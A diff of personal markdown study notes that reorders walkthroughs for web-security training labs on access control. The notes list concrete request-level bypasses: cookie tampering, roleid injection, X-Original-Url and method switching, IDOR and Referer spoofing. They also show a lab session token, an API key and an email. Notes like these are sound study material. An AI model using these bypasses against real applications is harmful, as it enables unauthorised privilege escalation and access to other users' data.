@@ -852,74 +852,72 @@
   ```
 
 ### Access Control Lab
-- Unprotected admin functionality
-  - browse /**robots.txt**
-  - Disallow: /**administrator-panel**
-- Unprotected admin functionality with **unpredictable URL**
-  - Target Site Map > Right click Engagement Tools > **Find script**
-    adminPanelTag.setAttribute('href', '/admin-8trs8m');
-- User role controlled by **request parameter**
-  - GET /my-account?id=wiener
-    **Cookie: Admin=false**; session=LBIW6sGesUS0nfCXovL7GFhhmW8tobYb
-  - Change the cookie value > **Admin=true**
-- User ID controlled by **request parameter**
-  - change the id to another user (horizontal privilege escalation)   
-  - GET /my-account?`id=carlos`
-- **User rol**e can be **modified** in user profile
-  - POST /my-account/change-email
-    Body {"email":"edisonchen2019@gmail.com"}
-  - Response
-    ```   
-    {
-     "username": "wiener",
-     "email": "edisonchen2019@gmail.com",
-     "apikey": "ppquj0gz6sLCcuFt7ATXkID0dnsuJP4u",
-     "roleid": 1
-    }
-    ```  
-  - Append roleid to uppdate   
-    Body {"email":"edisonchen2019@gmail.com", **"roleid": 2**}   
-- **URL-based** access control can be circumvented
-  - GET /admin > access denied
-  - GET /  > response 200
-    X-Original-Url: /admin
-  - Delete the user `<a href="/admin/delete?username=carlos">`   
-    GET `/?username=carlos`   
-    `X-Original-Url: /admin/delete`   
-- **Method-based** access control can be circumvented
-  - **Admin upgrade user**
-    POST /admin-roles   
-    username=carlos&action=upgrade   
-  - Another window **login as normal user (wiener)**
-    Right click repeater of POST /admin-roles > **Change request method**
-    change the session to own cookies
-    **GET** /admin-roles?**username=wiener**&action=upgrade
-- **User ID **controlled by **request parameter**
-  - GET /my-account?`id=carlos`   
-- User ID controlled by request parameter, with unpredictable user IDs
-  - GET /my-account?`id=75b04a0a-1476-4e20-9b58-f2e7b77de253`
-  - Dicover other user ID in website   
-- **User ID** controlled by **request parameter** with **data leakage in redirect**
-  - change the id to another user (horizontal privilege escalation)   
-  - GET /my-account?`id=carlos` > 302 response code
-  - Redirect to /login page but body response leak the API key   
-- **User ID** controlled by **request parameter** with **password disclosure**
-  - GET /my-account?`id=administrator`
-  - response leak the administrator password
-- **Insecure direct object references**
-  - view other chat history   
-    GET /download-transcript/`1.txt`
-- **Multi-step process** with no access control on one step
-  - 1st step: POST /admin-roles   
-    username=carlos&action=upgrade > access denied   
-  - 2nd step Confirmation: POST /admin-roles   
-    action=upgrade&**confirmed=true**&**username=wiener**   
-    **Replace cookies with attacker's one** and replay it > OK   
-- **Referer**-based access control   
-  GET /admin-roles?**username=wiener**&action=upgrade   
-  Referer: https://0a6700d3044a5e898157ed94008d007c.web-security-academy.net/admin   
-  Login as wiener user, obtain the cookie, replace in the original admin's request   
-  Missing referer > get unauthorized error > paste back the referrer > OK   
+1. Unprotected **admin functionality**
+   - browse /**robots.txt**
+   - Disallow: /**administrator-panel**
+2. Unprotected admin functionality with **unpredictable URL**
+   - Target Site Map > Right click Engagement Tools > **Find script**
+     adminPanelTag.setAttribute('href', '/admin-8trs8m');
+3. User role controlled by **request parameter**
+   - GET /my-account?id=wiener
+     **Cookie: Admin=false**; session=LBIW6sGesUS0nfCXovL7GFhhmW8tobYb
+   - Change the cookie value > **Admin=true**
+4. **User role can be modified** in user profile
+   - POST /my-account/change-email
+     Body {"email":"edisonchen2019@gmail.com"}
+   - Response
+     ```   
+     {
+      "username": "wiener",
+      "email": "edisonchen2019@gmail.com",
+      "apikey": "ppquj0gz6sLCcuFt7ATXkID0dnsuJP4u",
+      "roleid": 1
+     }
+     ```  
+   - Append roleid to uppdate   
+     Body {"email":"edisonchen2019@gmail.com", **"roleid": 2**}       
+5. User ID controlled by **request parameter**
+   - change the id to another user (horizontal privilege escalation)   
+   - GET /my-account?`id=carlos`
+6 **User ID controlled by request parameter**, with unpredictable user IDs
+   - GET /my-account?`id=75b04a0a-1476-4e20-9b58-f2e7b77de253`
+   - Dicover other user ID in website
+7. **User ID** controlled by **request parameter** with **data leakage in redirect**
+   - change the id to another user (horizontal privilege escalation)   
+   - GET /my-account?`id=carlos` > 302 response code
+   - Redirect to /login page but body response leak the API key
+8. **User ID** controlled by **request parameter** with **password disclosure**
+   - GET /my-account?`id=administrator`
+   - response leak the administrator password
+9. **Insecure direct object references**
+   - view other chat history   
+     GET /download-transcript/`1.txt`     
+10. **URL-based** access control can be circumvented
+   - GET /admin > access denied
+   - GET /  > response 200
+     X-Original-Url: /admin
+   - Delete the user `<a href="/admin/delete?username=carlos">`   
+     GET `/?username=carlos`   
+     `X-Original-Url: /admin/delete`   
+11. **Method-based** access control can be circumvented
+   - **Admin upgrade user**
+     POST /admin-roles   
+     username=carlos&action=upgrade   
+   - Another window **login as normal user (wiener)**
+     Right click repeater of POST /admin-roles > **Change request method**
+     change the session to own cookies
+     **GET** /admin-roles?**username=wiener**&action=upgrade  
+12. **Multi-step process** with no access control on one step
+   - 1st step: POST /admin-roles   
+     username=carlos&action=upgrade > access denied   
+   - 2nd step Confirmation: POST /admin-roles   
+     action=upgrade&**confirmed=true**&**username=wiener**   
+     **Replace cookies with attacker's one** and replay it > OK   
+13. **Referer**-based access control   
+   GET /admin-roles?**username=wiener**&action=upgrade   
+   Referer: https://0a6700d3044a5e898157ed94008d007c.web-security-academy.net/admin   
+   Login as wiener user, obtain the cookie, replace in the original admin's request   
+   Missing referer > get unauthorized error > paste back the referrer > OK   
 
 ## File Upload
 **Example of remote code**   
